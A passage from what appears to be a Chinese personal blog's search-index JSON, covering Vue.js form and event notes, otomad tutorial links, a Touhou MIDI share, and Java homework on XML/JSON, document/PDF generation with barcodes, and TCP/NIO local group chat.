-->\n<a v-on:click.stop.prevent=\"doThat\"></a>\n\n<!-- 只有修饰符 -->\n<form v-on:submit.prevent></form>\n\n<!-- 添加事件监听器时使用事件捕获模式 -->\n<!-- 即内部元素触发的事件先在此处理，然后才交由内部元素进行处理 -->\n<div v-on:click.capture=\"doThis\">...</div>\n\n<!-- 只当在 event.target 是当前元素自身时触发处理函数 -->\n<!-- 即事件不是从内部元素触发的 -->\n<div v-on:click.self=\"doThat\">...</div>\n\n<!-- 2.1.4新增 点击事件将只会触发一次 -->\n<a v-on:click.once=\"doThis\"></a>\n\n<!-- 2.3.0新增 滚动事件的默认行为 (即滚动行为) 将会立即触发 -->\n<!-- 而不会等待 `onScroll` 完成  -->\n<!-- 这其中包含 `event.preventDefault()` 的情况 -->\n<div v-on:scroll.passive=\"onScroll\">...</div>\n```\n\n## **表单输入绑定**\n- v-model 在内部为不同的输入元素使用不同的 property 并抛出不同的事件：\n    - text 和 textarea 元素使用 value property 和 input 事件\n    - checkbox 和 radio 使用 checked property 和 change 事件\n    - select 字段将 value 作为 property 并将 change 作为事件\n### 文本/多行文本\n```html\n<input v-model=\"message\">\n<textarea v-model=\"message\"></textarea>\n```\n### 复选框\n- 单个复选框，绑定到布尔值\n```html\n<input type=\"checkbox\" id=\"checkbox\" v-model=\"checked\">\n```\n```js\nnew Vue({\n  el: '...',\n  data: {\n    checked: false\n  }\n})\n```\n- 多个复选框，绑定到同一个数组\n```html\n<input type=\"checkbox\" id=\"jack\" value=\"Jack\" v-model=\"checkedNames\">\n<input type=\"checkbox\" id=\"john\" value=\"John\" v-model=\"checkedNames\">\n<input type=\"checkbox\" id=\"mike\" value=\"Mike\" v-model=\"checkedNames\">\n```\n```js\nnew Vue({\n  el: '...',\n  data: {\n    checkedNames: []\n  }\n})\n```\n### 单选按钮\n```html\n<input type=\"radio\" id=\"one\" value=\"One\" v-model=\"picked\">\n<input type=\"radio\" id=\"two\" value=\"Two\" v-model=\"picked\">\n```\n```js\nnew Vue({\n  el: '#example-4',\n  data: {\n    picked: ''\n  }\n})\n```\n### 表单修饰符\n- .lazy 默认情况下， v-model 在 input 事件中同步输入框的值与数据，添加一个修饰符 lazy ，从而转变为在 change 事件中同步\n```html\n<input v-model.lazy=\"msg\" > \n```\n- .number 自动将用户的输入值转为 Number 类型（如果原值的转换结果为 NaN 则返回原值）\n```html\n<input v-model.number=\"age\" type=\"number\">\n```\n - .trim 自动过滤用户输入的首尾空格\n ```html\n<input v-model.trim=\"msg\">\n```\n\n## **组件**\n### 注册\n#### 全局注册\n```js\nVue.component('component-a', { /* ... */ })\nnew Vue({ el: '#app' })\n```\n#### 局部注册\n```js\nvar ComponentA = { /* ... */ }\nnew Vue({\n  el: '#app',\n  components: {\n    'component-a': ComponentA\n  }\n})\n```","tags":["前端","vue"],"categories":["前端","vue"]},{"title":"音MAD教程","url":"/reimu-lighthouse/20210925/otomad-tutorial/","content":"- 2022.8.12 更新\n\n## 基础\n### 系统性教学\n\n{% externalLinkCard \"【音MAD教程入门篇】给萌新的零基础音MAD教学！\" https://www.bilibili.com/video/BV1v5411Q7LH/ auto %}\n\n{% externalLinkCard \"【音MAD教程】如何寻找教程\" https://www.bilibili.com/video/BV1BN411Q7Wk/ auto %}\n\n{% externalLinkCard \"【MMaker】新手 AE&音MAD 教程\" https://www.bilibili.com/video/BV1LE411A7NH/ auto %}\n\n{% externalLinkCard \"【音MAD教程番外篇】如何做一个合作单品？\" https://www.bilibili.com/video/BV1xS4y1s7SK/ auto %}\n\n### Vegas\n\n{% externalLinkCard \"【入门向】鬼畜（音MAD）制作教程\" https://www.bilibili.com/video/BV1ox411c7xV/ auto %}\n\n{% externalLinkCard \"音mad教程-BPM篇\" https://www.bilibili.com/video/BV1ss411f7nt/ auto %}\n### Pr\n\n{% externalLinkCard \"【音MAD教程】教大家如何做音画同步以及一些特效\" https://www.bilibili.com/video/BV1is411o7S7/ auto %}\n\n### 网站\n\n{% externalLinkCard \"音MAD维基\" https://otomad.wiki/ https://otomad.wiki/kawaii/Wiki_Logo_Animated.svg?de058 %}\n\n{% externalLinkCard \"MMaker's YTPMV & 音MAD Document\" https://mmaker.moe/ytpmv/ https://mmaker.moe/mmaker.png %}\n\n## 音频\n### Fl\n\n{% externalLinkCard \"【FL教程】【音MAD教程】harmor较系统讲解【建议倍速观看】【分集】\" https://www.bilibili.com/video/BV184411B7dF/ auto %}\n\n{% externalLinkCard \"harmor在制作音mad和鬼畜时的一种应用\" https://www.bilibili.com/video/BV1gs411G7ei/ auto %}\n  \n{% externalLinkCard \"混音Fabfilter（肥波）全套教程【15集】| 压缩、EQ、混响、多段、滤波效果器超全讲解\" https://www.bilibili.com/video/BV1ii4y157Tn/ auto %}\n\n### UTAU && Melodyne\n\n{% externalLinkCard \"【鬼畜调音教程】全网最详细！涵盖Melodyne、UTAU等多种调音软件讲解，手把手保姆级教学\" https://www.bilibili.com/video/BV1UU4y1c7yL/ auto %}\n\n### 扒谱&&修音\n\n{% externalLinkCard \"【教程】扒谱软件wavetone的使用\" https://www.bilibili.com/video/BV1G4411N7WF/ auto %}\n\n{% externalLinkCard \"【个人渣翻】VocalShifter的使用方法1\" https://www.bilibili.com/video/BV1KW411i7Dq/ auto %}\n\n{% externalLinkCard \"【鬼畜教程】辅助工具Vocalshifter（VSH）使用教程\" https://www.bilibili.com/read/cv3113948/ auto %}\n\n## PV\n### 一图流\n\n{% externalLinkCard \"【教程搬运】Vegas音频可视化\" https://www.bilibili.com/video/BV1ix411W78s/ auto %}\n\n{% externalLinkCard \"AE 教学 Particular 粒子可视化 音震荡教学分享\" https://www.bilibili.com/video/BV1Gx411M7ur/ auto %}\n\n{% externalLinkCard \"【AE教程第6期】快速制作酷炫的音频频谱+原版粒子特效（节奏 音频 pv常用 跟随音乐 可视化音频 音乐可视化 白衣）\" https://www.bilibili.com/video/BV1Hx411J7Vz/ auto %}\n\n### 常用效果\n\n{% externalLinkCard \"\\[教程\\]音mad中PV常用的效果\" https://www.bilibili.com/video/BV1St411u7hV/ auto %}\n\n{% externalLinkCard \"\\[教程\\]音mad中常用PV效果2\" https://www.bilibili.com/video/BV1aK4y1b7PN/ auto %}\n\n{% externalLinkCard \"罡渡晨星AE-Form粒子全析教学80节\" https://www.bilibili.com/video/BV1Gx411Q79D/ auto %}\n\n{% externalLinkCard \"【AE教程】我不可能会制作樱花飞舞的效果。\" https://www.bilibili.com/video/BV1jx411i7ys/ auto %}\n\n{% externalLinkCard \"AE教你如何做出香蕉与阿鲲动态光效描边效果！\" https://www.bilibili.com/video/BV1tb411g7Uh/ auto %}\n\n{% externalLinkCard \"【AE教程】让你的文字随着音乐节拍跳动~beats！\" https://www.bilibili.com/video/BV1w4411t7jE/ auto %}\n\n{% externalLinkCard \"【AE插件】使用FreqReact自动将声音变为运动\\[1.5版本\\]\" https://www.bilibili.com/video/BV1Pq4y1n7uq/ auto %}\n\n{% externalLinkCard \"\\[Vegas教程\\] 平铺、传送带效果制作\" https://www.bilibili.com/read/cv11110585/ auto %}\n## 其他\n\n{% externalLinkCard \"\\[2号式动画讲座\\]\\[新人向\\]音mad的中低音部\" https://www.bilibili.com/video/BV1F4411x7bS/ auto %}\n\n{% externalLinkCard \"谁都学不会的vegas音频进阶教程\" https://www.bilibili.com/video/BV1Px411y7zQ/ auto %}\n\n{% externalLinkCard \"【熟肉】【软件配布】AI-MGRoid制作方法（AI姉貴UTA版教程）＋使用例\" https://www.bilibili.com/video/BV1hL411b7xe/ auto %}\n\n{% externalLinkCard \"鬼畜人力V音源配布整理（持续更新）\" https://www.bilibili.com/read/cv363982/ auto %}\n\n{% externalLinkCard \"关于NEUTRINO的基本使用方法\" https://www.bilibili.com/read/cv4971143/ auto %}\n","tags":["音MAD"],"categories":["音MAD"]},{"title":"MIDI配布","url":"/reimu-lighthouse/20210925/otomad-midi/","content":"- 简单整理了一下之前扒过的东方曲子，希望能帮到有需要的人\n- 仅供学习和参考用途，禁止二次上传\n- 部分乐器来源于站内视频眼扒，因为当时技术力不太够\n- 链接: https://pan.baidu.com/s/14l1QjaBTH2YUWnC4PTTzJw 提取码: wnhx \n- 所有MIDI均，可能存在错音，请谅解\n## 目录\n- 2021.6.14更新\n  - 死灵的夜樱\n  - 会受稻田姬的斥责啦\n  - 兔已着陆\n  - 今宵是飘逸的自我主义者\n  - 天魔之山漫天星\n  - Smoking Dragon\n  - 大吉猫咪\n  - 心之所在\n  - 小小的贤将\n  - 春之岸边\n- 2021.9.25更新\n  - 东方绯想天\n  - last remote","tags":["音MAD"],"categories":["音MAD"]},{"title":"Java 高级文件处理作业","url":"/reimu-lighthouse/20210925/java-advanced-file-processing-homework/","content":"## xml和json的处理\n### 要求\n- 读入以下的score.xml文件，并转化为JSON  Object对象，输出JSON Object的字符串表达式。最后，根据JSON Object 的值和score.xml的样式，重新生成score2.xml。\n```xml\n​<student>\n​  <name>Tom</name>\n​  <subject>math</subject>\n​  <score>80</score>\n​</student>\n```\n- 读取和写入xml方法不限，JSON处理方法不限。\n### maven依赖\n```xml\n<dependency>\n    <groupId>dom4j</groupId>\n    <artifactId>dom4j</artifactId>\n    <version>1.6.1</version>\n</dependency>\n<!--net.sf.json-lib可能不需要-->\n<dependency>\n    <groupId>net.sf.json-lib</groupId>\n    <artifactId>json-lib</artifactId>\n    <version>2.4</version>\n    <classifier>jdk15</classifier>\n</dependency>\n<dependency>\n    <groupId>org.json</groupId>\n    <artifactId>json</artifactId>\n    <version>20160810</version>\n</dependency>\n<dependency>\n    <groupId>commons-io</groupId>\n    <artifactId>commons-io</artifactId>\n    <version>2.8.0</version>\n</dependency>\n```\n### 本体\n```java\nimport org.apache.commons.io.IOUtils;\nimport org.dom4j.Document;\nimport org.dom4j.io.SAXReader;\nimport org.dom4j.io.XMLWriter;\nimport org.json.JSONObject;\nimport org.json.XML;\nimport org.dom4j.io.OutputFormat;\n\nimport java.io.*;\n\npublic class Xml2Json {\n\n    public static void xml2Json() throws Exception {\n        InputStream in = new FileInputStream(\"src/main/resources/score.xml\");\n        String xml = IOUtils.toString(in);\n        JSONObject xmlJSONObj = XML.toJSONObject(xml);\n        String json = xmlJSONObj.toString();\n        writeFile(json, \"src/main/resources/score.json\");\n        System.out.println(json);\n\n    }\n\n    public static void json2Xml() throws Exception {\n        InputStream in = new FileInputStream(\"src/main/resources/score.json\");\n        String json = IOUtils.toString(in);\n        JSONObject jsonObject = new JSONObject(json);\n        String xml = XML.toString(jsonObject);\n        xml = format(xml);\n        writeFile(xml, \"src/main/resources/score2.xml\");\n    }\n\n    public static void writeFile(String s, String url) {\n        try (BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(url)))) {\n            bw.write(s);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String format(String str) throws Exception {\n        Document doc = new SAXReader().read(new StringReader(str));\n        OutputFormat formater = OutputFormat.createPrettyPrint();\n        formater.setEncoding(\"UTF-8\");\n        StringWriter out = new StringWriter();\n        XMLWriter writer = new XMLWriter(out, formater);\n        writer.write(doc);\n        writer.close();\n        return out.toString();\n    }\n\n    public static void main(String[] args) throws Exception {\n        xml2Json();\n        json2Xml();\n    }\n}\n```\n\n## xls、doc、pdf的处理和条形码的生成\n### 要求\n- 读取student.xslx里面的数据，根据预设的student.docx模板，生成学生具体的信息文档，最后转化为pdf文档。\n- 整个程序可以分成多个步骤，或者整合为一个程序。\n### maven依赖\n```xml\n<dependency>\n    <groupId>com.lowagie</groupId>\n    <artifactId>itext</artifactId>\n    <version>2.1.7</version>\n</dependency>\n<dependency>\n    <groupId>fr.opensagres.xdocreport</groupId>\n    <artifactId>org.apache.poi.xwpf.converter.pdf</artifactId>\n    <version>1.0.6</version>\n</dependency>\n<!--org.apache.pdfbox可能不需要-->\n<dependency>\n    <groupId>org.apache.pdfbox</groupId>\n    <artifactId>pdfbox</artifactId>\n    <version>2.0.13</version>\n</dependency>\n<dependency>\n    <groupId>org.apache.pdfbox</groupId>\n    <artifactId>xmpbox</artifactId>\n    <version>2.0.13</version>\n</dependency>\n<!--com.itextpdf可能不需要-->\n<dependency>\n    <groupId>com.itextpdf</groupId>\n    <artifactId>itextpdf</artifactId>\n    <version>5.5.13</version>\n</dependency>\n<dependency>\n    <groupId>org.apache.poi</groupId>\n    <artifactId>poi</artifactId>\n    <version>3.15</version>\n</dependency>\n<dependency>\n    <groupId>org.apache.poi</groupId>\n    <artifactId>poi-ooxml-schemas</artifactId>\n    <version>3.15</version>\n</dependency>\n<dependency>\n    <groupId>org.apache.xmlbeans</groupId>\n    <artifactId>xmlbeans</artifactId>\n    <version>3.1.0</version>\n</dependency>\n<dependency>\n    <groupId>org.apache.poi</groupId>\n    <artifactId>poi-ooxml</artifactId>\n    <version>3.15</version>\n</dependency>\n<dependency>\n    <groupId>org.apache.poi</groupId>\n    <artifactId>poi-scratchpad</artifactId>\n    <version>3.15</version>\n</dependency>\n<dependency>\n    <groupId>com.google.zxing</groupId>\n    <artifactId>core</artifactId>\n    <version>3.3.3</version>\n</dependency>\n<dependency>\n    <groupId>com.google.zxing</groupId>\n    <artifactId>javase</artifactId>\n    <version>3.3.3</version>\n</dependency>\n```\n### 本体\n```java\nimport com.google.zxing.BarcodeFormat;\nimport com.google.zxing.MultiFormatWriter;\nimport com.google.zxing.client.j2se.MatrixToImageWriter;\nimport com.google.zxing.common.BitMatrix;\nimport com.lowagie.text.Font;\nimport com.lowagie.text.pdf.BaseFont;\nimport fr.opensagres.xdocreport.itext.extension.font.IFontProvider;\nimport fr.opensagres.xdocreport.itext.extension.font.ITextFontRegistry;\nimport org.apache.poi.ss.usermodel.CellType;\nimport org.apache.poi.util.Units;\nimport org.apache.poi.xssf.usermodel.XSSFCell;\nimport org.apache.poi.xssf.usermodel.XSSFRow;\nimport org.apache.poi.xssf.usermodel.XSSFSheet;\nimport org.apache.poi.xssf.usermodel.XSSFWorkbook;\nimport org.apache.poi.xwpf.converter.pdf.PdfConverter;\nimport org.apache.poi.xwpf.converter.pdf.PdfOptions;\nimport org.apache.poi.xwpf.usermodel.*;\nimport org.apache.poi.xwpf.usermodel.XWPFDocument;\n\n\nimport javax.imageio.ImageIO;\nimport java.awt.*;\nimport java.awt.image.BufferedImage;\nimport java.io.*;\nimport java.util.*;\nimport java.util.List;\n\npublic class Main {\n    public static final int CODEWIDTH = 130;\n    public static int HEIGHT = 80;\n    public static final int CODEHEIGHT = 70;\n    public static int FONTSIZE = 10;\n\n    public static void main(String[] args) throws Exception {\n        //读取xls,存入List中\n        List<String> list = readXls();\n        //生成条形码\n        File file = new File(\"src/main/resources/code.png\");\n        generateCode(file, list.get(2), CODEWIDTH, CODEHEIGHT);\n        generateFont(file, list.get(2));\n        //构造替换映射\n        Map<String, Object> params = new HashMap<String, Object>();\n        params.put(\"{name}\", list.get(0));\n        params.put(\"{sex}\", list.get(1));\n        params.put(\"{barcode}\", list.get(2));\n        //解析doc并替换\n        parserDoc(params);\n        //doc转换为pdf\n        writePdf();\n        System.out.println(\"generate successfully!\");\n    }\n\n    public static List<String> readXls() throws Exception {\n        List<String> list = new ArrayList<>();\n        InputStream ExcelFileToRead = new FileInputStream(\"src/main/resources/student.xlsx\");\n        XSSFWorkbook workbook = new XSSFWorkbook(ExcelFileToRead);\n        XSSFSheet sheet = workbook.getSheetAt(0);\n\n        //先按行读取，再在每行中按列读取\n        Iterator rows = sheet.iterator();\n        while (rows.hasNext()) {\n            XSSFRow row = (XSSFRow) rows.next();\n            Iterator cells = row.cellIterator();\n            while (cells.hasNext()) {\n                XSSFCell cell = (XSSFCell) cells.next();\n                //判断是否为字符串还是数字\n                if (cell.getCellTypeEnum() == CellType.STRING) {\n                    list.add(cell.getStringCellValue());\n                } else if (cell.getCellTypeEnum() == CellType.NUMERIC) {\n                    list.add(\"\" + cell.getNumericCellValue());\n                }\n            }\n        }\n        ExcelFileToRead.close();\n        return list;\n    }\n\n    public static void replaceRun(XWPFParagraph xwpfParagraph, Map<String, Object> params) throws Exception {\n        //获得XWPFRuns\n        List<XWPFRun> runs = xwpfParagraph.getRuns();\n        if (runs.size() > 0) {\n            for (XWPFRun re : runs) {\n                //判断是否为非空run\n                if (re.text() != null || re.text().length() > 0) {\n                    String match = re.text();\n                    //判断是否能被替换\n                    if (params.containsKey(match)) {\n                        //判断是否是条形码\n                        if (match.equals(\"{barcode}\")) {\n                            xwpfParagraph.removeRun(0);\n                            XWPFRun run = xwpfParagraph.createRun();\n                            int format = XWPFDocument.PICTURE_TYPE_PNG;\n                            //添加条形码图片\n                            run.addPicture(new FileInputStream(\"src/main/resources/code_new.png\"), format,\n                                    \"src/main/resources/code_new.png\", Units.toEMU(CODEWIDTH), Units.toEMU(CODEHEIGHT));\n                        } else {\n                            //正常文本替换\n                            xwpfParagraph.removeRun(0);\n                            XWPFRun run = xwpfParagraph.createRun();\n                            run.setText(params.get(match).toString());\n                        }\n                    }\n                }\n            }\n        }\n    }\n\n    public static void parserDoc(Map<String, Object> params) throws Exception {\n        InputStream WordFileToRead = new FileInputStream(\"src/main/resources/student.docx\");\n        XWPFDocument xwpfDocument = new XWPFDocument(WordFileToRead);\n        //获得IBodyElement\n        List<IBodyElement> iBodyElements = xwpfDocument.getBodyElements();\n        for (IBodyElement ibs : iBodyElements) {\n            BodyElementType bodyElementType = ibs.getElementType();\n            //是否为表格\n            if (bodyElementType == BodyElementType.TABLE) {\n                XWPFTable xwpfTable = (XWPFTable) ibs;\n                //获得行\n                List<XWPFTableRow> rows = xwpfTable.getRows();\n                for (XWPFTableRow row : rows) {\n                    //获得单元格\n                    List<XWPFTableCell> cells = row.getTableCells();\n                    for (XWPFTableCell cell : cells) {\n                        List<XWPFParagraph> paras = cell.getParagraphs();\n                        for (XWPFParagraph para : paras) {\n                            //替换Run\n                            replaceRun(para, params);\n                        }\n                    }\n                }\n            } else if (bodyElementType == BodyElementType.PARAGRAPH) {\n                XWPFParagraph xwpfParagraph = (XWPFParagraph) ibs;\n                //替换Run\n                replaceRun(xwpfParagraph, params);\n            }\n        }\n        OutputStream outputStream = new FileOutputStream(\"src/main/resources/student_new.docx\");\n        xwpfDocument.write(outputStream);\n        WordFileToRead.close();\n        outputStream.close();\n    }\n\n    public static void writePdf() throws Exception {\n        FileInputStream inputStream = new FileInputStream(\"src/main/resources/student_new.docx\");\n        XWPFDocument document = new XWPFDocument(inputStream);\n        PdfOptions options = PdfOptions.create();\n        options.fontProvider(new IFontProvider() {\n            @Override\n            public Font getFont(String familyName, String encoding, float size, int style, Color color) {\n                try {\n                    BaseFont bfChinese=BaseFont.createFont(\"C:/Windows/Fonts/simfang.ttf\",BaseFont.IDENTITY_H,BaseFont.EMBEDDED);\n                    Font fontChinese = new Font(bfChinese, size, style, color);\n                    if (familyName != null)\n                        fontChinese.setFamily(familyName);\n                    return fontChinese;\n                } catch(Exception e) {\n                    e.printStackTrace();\n                    return ITextFontRegistry.getRegistry().getFont(familyName, encoding, size, style, color);\n                }\n            }\n        });\n        PdfConverter.getInstance().convert(document, new FileOutputStream(\"src/main/resources/student.pdf\"), options);\n        inputStream.close();\n    }\n\n    public static void generateCode(File file, String code, int width, int height) {\n        BitMatrix matrix = null;\n        try {\n            MultiFormatWriter writer = new MultiFormatWriter();\n            matrix = writer.encode(code, BarcodeFormat.CODE_128, width, height, null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        try (FileOutputStream outputStream = new FileOutputStream(file)) {\n            ImageIO.write(MatrixToImageWriter.toBufferedImage(matrix), \"png\", outputStream);\n            outputStream.flush();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void generateFont(File file, String s) throws Exception {\n        BufferedImage code = ImageIO.read(file);\n        BufferedImage font = new BufferedImage(CODEWIDTH, HEIGHT, BufferedImage.TYPE_INT_RGB);\n        Graphics2D g = (Graphics2D) font.getGraphics();\n        g.clearRect(0, 0, CODEWIDTH, HEIGHT);\n        g.setColor(Color.WHITE);\n        g.fillRect(0, 0, CODEWIDTH, HEIGHT);\n        g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);\n        g.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);\n        for (int i = 0; i < s.length(); i++) {\n            g.setColor(Color.black);\n            java.awt.Font font_ = new java.awt.Font(\"Consolas\", 0, FONTSIZE);\n            g.setFont(font_);\n            g.drawString(s.charAt(i) + \"\", (FONTSIZE * 4 + CODEWIDTH - s.length() * FONTSIZE) / 2 + (i - 1) * FONTSIZE * 5 / 6, HEIGHT);\n        }\n        g.drawImage(code, 0, 0, null);\n        g.dispose();\n        File outputfile = new File(\"src/main/resources/code_new.png\");\n        ImageIO.write(font, \"png\", outputfile);\n    }\n}\n```","tags":["Java"],"categories":["Java","Java进阶"]},{"title":"Java 网络编程作业","url":"/reimu-lighthouse/20210925/java-network-programming-homework/","content":"## TCP编程\n### 要求\n- 请编写一个群聊的程序，包括服务端程序和客户端程序。 \n- 服务端功能：收到某客户端的信息，将消息在控制台输出，然后，发给其他另外的客户端。\n- 客户端功能：每隔5秒发送一条信息给服务端。然后接收服务器转发过来的消息，并在控制台输出。\n### 客户端\n- 由于每隔5秒发送一条信息给服务端，所以考虑采用串行结构，每隔五秒发送固定字符，再进行读取\n- 也可以采用多线程，一个线程负责读取，一个线程负责发送\n- 由于DataOutputStream需要关闭流才能进行发送，而一旦关闭了流也就关闭了Socket，会抛出Socket is closed异常,所以采用PrintWriter而非DataOutputStream，服务端同理\n```java\nimport java.io.*;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.text.DateFormat;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class Client {\n    public static void main(String[] args) throws Exception {\n        //定义时间格式类\n        DateFormat normal=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        //定义Socket指向本机8001端口\n        Socket socket = new Socket(InetAddress.getByName(\"127.0.0.1\"), 8001);\n        //定义输入流\n        InputStream inputStream = socket.getInputStream();\n        //定义缓冲字符输入流\n        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n        //定义输出流\n        OutputStream outputStream = socket.getOutputStream();\n        //定义缓冲字符输出流\n        PrintWriter printWriter=new PrintWriter(outputStream);\n        while (true) {\n            int localPort = socket.getLocalPort();\n            String msg=localPort + \"port send a message to server\";\n            //向输出流中写入数据 \n            printWriter.println(msg);\n            //刷新缓冲区，向服务端发送信息 \n            printWriter.flush();\n            //如果输入流中有数据，则读取\n            if (bufferedReader.ready()) {\n                System.out.print(normal.format(new Date())+\" Receive from Server:\");\n                System.out.println(bufferedReader.readLine());\n            }\n            try {\n                Thread.sleep(5000);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n}\n```\n### 服务端\n- 服务端相比于客户端更为复杂，首先考虑使用线程池来进行多个Client连接\n- 为了实现群发效果，需要使用List记录当前处于连接状态的所有Socket，在群发过程中进行逐个遍历，同时更新List去除失去连接的Socket，使用CopyOnWriteArrayList防止线程不同步\n```java\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.text.DateFormat;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.concurrent.CopyOnWriteArrayList;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadPoolExecutor;\n\npublic class Server {\n    public static void main(String[] args) throws Exception {\n        //定义时间格式化类\n        DateFormat normal=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        //定义固定大小线程池\n        ThreadPoolExecutor executor = (ThreadPoolExecutor) Executors.newFixedThreadPool(4);\n        //定义ServerSocket绑定8001端口\n        ServerSocket serverSocket = new ServerSocket(8001);\n        //定义列表存入当前处于连接中的Socket，便于群发\n        //使用CopyOnWriteArrayList防止线程不同步\n        List<Socket> sockets = new CopyOnWriteArrayList<Socket>();\n        while (true) {\n            System.out.println(normal.format(new Date())+\" Waiting...\");\n            //等待连接\n            Socket socket = serverSocket.accept();\n            //socket加入列表\n            sockets.add(socket);\n            System.out.println(normal.format(new Date())+\" Connecting successfully \" + socket.getInetAddress() + \":\" + socket.getPort());\n            //构造线程处理socket\n            executor.execute(new SingleServer(sockets, socket));\n        }\n    }\n}\n\nclass SingleServer implements Runnable {\n    List<Socket> sockets;\n    Socket socket;\n\n    public SingleServer(List<Socket> sockets, Socket socket) {\n        this.sockets = sockets;\n        this.socket = socket;\n    }\n\n    @Override\n    public void run() {\n        //定义时间格式化类\n        DateFormat normal=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        try {\n            //定义输入流\n            InputStream inputStream = socket.getInputStream();\n            //定义缓冲字符输入流\n            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n            while (true) {\n                //读取输入流数据\n                System.out.println(normal.format(new Date())+\" Receive from \" + socket.getInetAddress() + \":\" + socket.getPort() +\"  Message:\"+ bufferedReader.readLine());\n                synchronized (sockets) {\n                    Iterator<Socket> iterator=sockets.iterator();\n                    //逐个遍历List\n                    while(iterator.hasNext()) {\n                        Socket soc=iterator.next();\n                        if (soc.isConnected()) {\n                            //如果不是发送端Socket,则向其群发\n                            if (soc != socket) {\n                                OutputStream outputStream = soc.getOutputStream();\n                                PrintWriter printWriter = new PrintWriter(outputStream);\n                                printWriter.println(bufferedReader.readLine());\n                                printWriter.flush();\n                            }\n                        } else {\n                            //去除失去连接的Socket\n                            iterator.remove();\n                        }\n                    }\n                }\n                Thread.sleep(100);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n## NIO编程\n### 要求\n- 请基于NIO(第6章第六节的NIO，非AIO)编写一个群聊的程序，包括服务端程序和客户端程序。 \n- 服务端功能：只用一个线程，收到某客户端的信息，将消息在控制台输出，然后，发给其他另外的客户端。\n- 客户端功能：每隔5秒发送一条信息给服务端。然后接收服务器转发过来的消息，并在控制台输出。\n### 客户端\n- 和TCP编程不同，客户端的Selector轮询需要不停地进行，而发送消息需要每隔5秒进行，无法进行串行编写，所以需要创建一个新线程进行发送消息\n```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.StandardCharsets;\nimport java.text.DateFormat;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class Client {\n\n    public static void main(String[] args) throws Exception {\n        //定义Selector\n        Selector selector = Selector.open();\n        //定义SocketChannel\n        SocketChannel socketChannel = SocketChannel.open();\n        //设置非阻塞模式\n        socketChannel.configureBlocking(false);\n        //连接服务端并注册事件\n        if (socketChannel.connect(new InetSocketAddress(\"127.0.0.1\", 8001))) {\n            socketChannel.register(selector, SelectionKey.OP_READ);\n        } else {\n            socketChannel.register(selector, SelectionKey.OP_CONNECT);\n        }\n        //构造新线程向服务端发送消息\n        new Thread(new DoWrite(socketChannel)).start();\n        //选择器轮询\n        while (true) {\n            try {\n                //1000ms响应时间\n                selector.select(1000);\n                //获得感兴趣事件的SelectionKey\n                Set<SelectionKey> selectionKeys = selector.selectedKeys();\n                Iterator<SelectionKey> iterator = selectionKeys.iterator();\n                //逐个遍历\n                while (iterator.hasNext()) {\n                    SelectionKey key = iterator.next();\n                    iterator.remove();\n                    try {\n                        //处理\n                        handleInput(selector, key);\n                    } catch (Exception e) {\n                        if (key != null) {\n                            key.cancel();\n                            if (key.channel() != null) {\n                                key.channel().close();\n                            }\n                        }\n                    }\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static void handleInput(Selector selector, SelectionKey key) throws Exception {\n        //定义时间格式化类\n        DateFormat normal = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        if (key.isValid()) {\n            //获得Key的SocketChannel\n            SocketChannel socketChannel = (SocketChannel) key.channel();\n            //连接状态(连接中)\n            if (key.isConnectable()) {\n                //如果连接成功则向Selector注册READ事件\n                if (socketChannel.finishConnect()) {\n                    socketChannel.register(selector, SelectionKey.OP_READ);\n                }\n            }\n            //可读状态(收到服务端的数据)\n            if (key.isReadable()) {\n                ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                //读取socketChannel中的数据\n                int readBytes = socketChannel.read(byteBuffer);\n                if (readBytes > 0) {\n                    //写入buffer->读取buffer\n                    byteBuffer.flip();\n                    byte[] bytes = new byte[byteBuffer.remaining()];\n                    byteBuffer.get(bytes);\n                    String message = new String(bytes, \"UTF-8\");\n                    System.out.println(normal.format(new Date()) + \" Receive from Server:\" + message);\n                } else if (readBytes < 0) {\n                    key.cancel();\n                    socketChannel.close();\n                }\n            }\n        }\n    }\n}\nclass DoWrite implements Runnable{\n    private SocketChannel socketChannel;\n\n    public DoWrite(SocketChannel socketChannel) {\n        this.socketChannel = socketChannel;\n    }\n    @Override\n    public void run() {\n        while(true) {\n            try {\n                //先休眠5秒防止未成功连接\n                Thread.sleep(5000);\n                int localPort=socketChannel.socket().getLocalPort();\n                String message=localPort + \"port send a message to server\";\n                byte[] str=message.getBytes(StandardCharsets.UTF_8);\n                ByteBuffer buffer=ByteBuffer.allocate(str.length);\n                buffer.put(str);\n                //写入buffer->读取buffer\n                buffer.flip();\n                //向SocketChannel写入数据\n                socketChannel.write(buffer);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n### 服务端\n- 和客户端类似，故不再赘述\n```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport 